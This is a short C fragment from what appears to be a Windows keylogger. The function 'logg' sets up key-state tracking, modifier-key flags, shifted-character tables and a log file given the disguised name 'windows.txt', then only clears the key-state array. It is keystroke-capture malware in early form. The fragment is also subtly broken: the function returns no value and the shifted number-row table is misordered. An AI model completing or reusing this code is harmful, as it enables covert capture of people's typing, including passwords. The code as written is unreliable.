DWORD WINAPI logg(){

int vkey,last_key_state[0xFF];
  int isCAPSLOCK,isNUMLOCK;
    int isL_SHIFT,isR_SHIFT;
      int isPressed;
      //char 
char showkey;
 char NumChar[]=")!@#$%&*^(";
   char chars_vn[]=";.`,/-=";
    char Chars_vs[]="~?><|:+";
      char chars_va[]="[\\]\';";
        char charrs_vb[]="{}\"";
        FILE *kh;
         char KEY_LOG_FILE[]="windows.txt";

      //: making last key state 0
      
     for(vkey=0;vkey<0xFF;vkey++){
        last_key_state[vkey]=0;

     }
        
}